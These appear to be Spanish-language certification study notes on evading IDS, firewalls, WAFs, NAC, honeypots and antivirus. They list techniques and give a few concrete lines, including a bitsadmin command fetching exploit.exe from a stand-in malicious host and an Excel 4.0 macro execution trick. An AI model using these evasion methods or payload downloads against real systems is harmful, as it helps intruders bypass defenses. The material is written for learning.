# EVASION IDS, FW, HONEYPOTS:

## IDS:

### Methodology:
- Signature: Firmas, o patrones muy especificos de tipos de ataques.
- Anomaly: Patrones fuera de lo comunen en el comportamiento
- Protocol Anomaly: Patrones fuera de lo comun en base a la normativa del tipo de protocolo

### Tipos:
- NIDS: Basado en comportamiento de la red por medio de sniffing.
- HIDS: Basado en el comportamiento local de un equipo.

### Herramientas:
- Snort:

-----"rule

-----protocol"-----"rule ip add"---------------------------------"alert message"
  
alert tcp any any -> 192.168.1.0/24 111(content:"|00 01 86 a5|"; msg: "mountd access";)

"alert-------"direction"-----"rule port"

Rule"

### IDS Evasion:
- Insertion Attack:
  - Inyección de parametros que el IDS considera inofensivos o interpreta diferente que la victima, por ejemplo un salto de linea puede hacer el rule no coincida, pero la victima lo tomara como un parametro valido para la vulnerabilidad.
- Evasion:
  - Enviar la información en pequeñas partes, donde el IDS podria descartar uno o más pequeñas secuencias, haciendo que pierda la visibilidad del contenido, pero la victima podria reconstruir el paquete.
- DoS Attack
  - Llenar el buffer del IDS para que pase todo.
- Obfuscating
  - Uso de protocolos cifrados cuando el IDS no usa "deep inspection", o encodear el paquete para que no sean legibles por IDS pero si por un web server.
- False Positive Generation:
  - Generar muchos falsos positivos para perder de vista cual es el ataque real.
- Session Splicing:
  - Enviar la información en pequeñas partes, donde el IDS por tema de tiempo de espera excedido la transmisión; no se reensabla el paquete haciendo dejando pasar los paquetes paquetes, haciendo que pierda la visibilidad del contenido, pero la victima podria reconstruir el paquete esperando más tiempo.
- Unicode Evasion:
  - Uso de encodeos no estandar que el IDS podria no reeconocer pero la victima si.
- Fragmentation Attack:
  - Fragmentación del paquete, esperando que el timeout del IDS en la reconstrucción del paquete sea muy baja a diferencia de la victima.
- Overlapping Fragments
- Time-To-Live Attacks: Enviar paquetes con TTL diferentes, haciendo que solo el IDS reciba todos, pero despues del IDS se acabe el TTL ya la victima ya no le llegue.
- Urgency Flag: Paquetes con URG podrian ser descartados o ignorados por IDS
- Invalid RST Packets: 
- Polymorphic Shellcode:
- ASCII Shellcode: El uso de ASCII puede hacer que algunos IDS no sepa interpretar el contendio.
- Application-Layer Attacks: Comprimir los paquetes puede ser muy util como metodo de evasión.
- Desynchronization: Enviar banderas de SYN puede hacer que el IDS se confunda y reinicie el conteo de la secuencia del paquete, pero la victima ignore el SYN.
- Encryption: Muy muy util, un IDS podria detectar la ecriptación pero nunca el contendio con un cifrado robusto.
- Flooding: Llenar de paquetes confusos al IDS para que no revise a profundidad el que traiga un paquete malicioso.

## IPS:
Lo mismo que el IDS, pero este si bloquea no solo sniffea el trafico.

## Firewall:

### Aquitectura:
- Bastion: Un solo FW.
- Screened subnet: Colocar redes tipo DMZ.
- Multi-homed: Varios FW.

### Tipos:

- Packet Filtering Firewall: Capa 3
- Circuit-Level Gateway Firewall: Capa 4 transporte
- Application-Level Firewall: Capa 5 Aplicación
- Stateful Multilayer Inspection Firewall: Capa 3, 4 y 5.
- Application Proxy: Servicios especificos de capa 5.

### Evasion:

#### Identificar:
- Port Scanning:
  - Identificar tipo de puertos para conocer tipo de firewall.
- Firewalking:
  - A traves del TTL se va incrementando uno por uno, hasta que se vea en que salto hay un bloqueo, o sí se puede llegar hasta un salto despues del firewall.
- Banner Grabbing
  - Identificar servicios por la respuesta que nos de al conectarnos a unos puertos, para conocer tipo de firewall.
- Source port:
  - --source-port modificar el origen de los request tanto en nmap o ncat puede permitir ver puertos como usar el puerto origen 53 

#### Evasión de trafico entrante:
- IP Address Spoofing:
  - Una validación basica de los FW es permitir IP especificas, que al duplicarla se puede pasar.
- Source Routing:
  - Modificar el trayecto del paquete, ya sea porque forces a que el paquete viaje por otro lado, porque tienen acceso al balanceo de un switch, etc. Pero el punto es llegar por otra ruta.
- Tiny Fragments:
  - Algunos FW solo revisan los primeros paquetes cuando existe fragmentación.
 
#### Evasión de trafico de salida:
- Using an IP Address in Place of a URL
  - Algunos FW bloquean por dominio, pero no por IP porque es dificil en dominios con muchas IP estar a cada rato bloqueando nuevas IP.
- Using Anonymous Website Surfing Sites
  - El clasico VPN, algunos:
    - https://www.free-proxy.com
    - https://anonymous-proxy-servers.net
    - https://zendproxy.com
    - https://proxify.com
    - http://www.guardster.com
    - http://anonymouse.org
- Using a Proxy Server
- ICMP Tunneling
  - En algunos casos sera bloqueado todo menos ICMP o incluso no se tiene ningun log de ICMP, inyectando datos dentro de la cabecera podemos insertar datos uno por uno para que lleguen al destino.
- ACK Tunneling:
  - Mismo que ICMP, inyectamos datos en cabeceras por medio de herramientas como AckCmd.
- HTTP Tunneling:
  - Usualmente las empresas bloquean la mayoria de los puertos dejando solo abierto la comunicación a sitios http, por lo que sí usamos una conexión tipo proxy donde el web server direccione todo nuestro trafico de otros puertos podremos salir por el 80 pero comunicarnos a otros puertos de fuera.
- SSH Tunneling:
  - Podemos usar metodos de pivoting, por ejemplo usar el metodo de conectarnos a un servidor de ssh, donde le decimos que el puerto local 5000 escuche peticiones y la mande al puerto 250 del servidor ssh.
- DNS Tunneling:
  - A traves de domains y subdomains conteniendo datos encodeados.
- Through External Systems
- Through MITM Attack
- Through Content
- Through XSS Attack
- Through HTML Smuggling
  - 
- Through Windows BITS
  - Usar el servicio de actualización de windows
```
powershell> bitsadmin /transfer exploit.exe https://malware.com/exploit.exe c:/exploit.exe
```

- WAF evasion:
  - Blacklist words.
  - Using HTTP Header Spoofing: Use X-Forwarded-For de ips de LAN, localhost, o IPs de confianza.
  - Using Fuzzing/Brute forcing: Use seclist.
  - Abusing SSL/TLS ciphers: Usar ciphers no soportados por el WAF pero si el web server.

## NAC:
Control de acceso seguro y autenticado para usuarios a la red.

### Evasión:
- VLAN hopping: Usando metodos para 
- Using a pre-authenticated device: Abusar de dispositivo autenticado duplicando su MAC o 

## Honeypot:
### Tipos:
- Low interaction: Servicios limitados y simulados.
- Medium Interaction: Se simula el sistema operativo y servicios.
- High Interaction: Se simula por completo el sistema y servicios.
- Pure: Se simula por completo el ambiente de producto.

### Herramientas:
- KFSensor:
- HoneyBOT:

### Detection:
La presencia de servicios que nos respondan con banners de servicio, pero no permitan completar un "three way hand shake" es porque posiblemente es un servicio falso, otra opción que en lo personal noto mucho es la presencia de servicios que se repiten en varios equipos en la red y que no es normal los tengan.

Tools:
- Send-safe Honeypot Hunter
- kippo_detect 

## YARA:
YARA is a malware research tool that allows security analysts to detect and classify malware or other malicious codes through a rule-based approach.

### Herramientas:
Las herramientas de yara lo que hacen es leer ficheros y extraer los strings que no sean repetibles en archivos comunes, y crear un "rule" inyectable en los controles.

- YaraRET (https://github.com) 
- Koodous (https://docs.koodous.com) 
- AutoYara (https://github.com)
- Halogen (https://github.com) 
- Yabin (https://github.com)

Example:
```
{
meta:
description = "This is just an example"
threat_level = 3
in_the_wild = true
strings:
$a = {6A 40 68 00 30 00 00 6A 14 8D 91}
$b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9}
$c = "UVODFRYSIHLNWPEJXQZAKCBGMT"
condition: $a or $b or $c 
}
```

## ANTIVIRUS:

### Evasión:

- Ghostwriting: Decompilar o desempaquetar el ejecutable e insertar nuevo codigo sin afectar las funciones originales.
  - Ghostwriting | github
- Using application whitelisting:
  - Ejecución a traves de aplicaciones que esten en listas blancas, como dll injection de aplicaciones permitidas, usar powershell, etc.
- XLM weaponization
  - MS Excel 4.0 Macro permite crear archivos que permite ejecución de codigo, usa “=exec("calc.exe")”, “=HALT()” y seleccionando "auto open", luego guardandolo como "Macro-Enabled workbook (.xlsm)"
- Dechaining macros:
  - 
- Clearing memory hooks
- Using Metasploit templates
- Bypassing Symantec Endpoint Protection
- Hosting phishing sites
- Passing encoded commands
- Fast flux DNS method
- Timing-based evasion
- Signed binary proxy execution















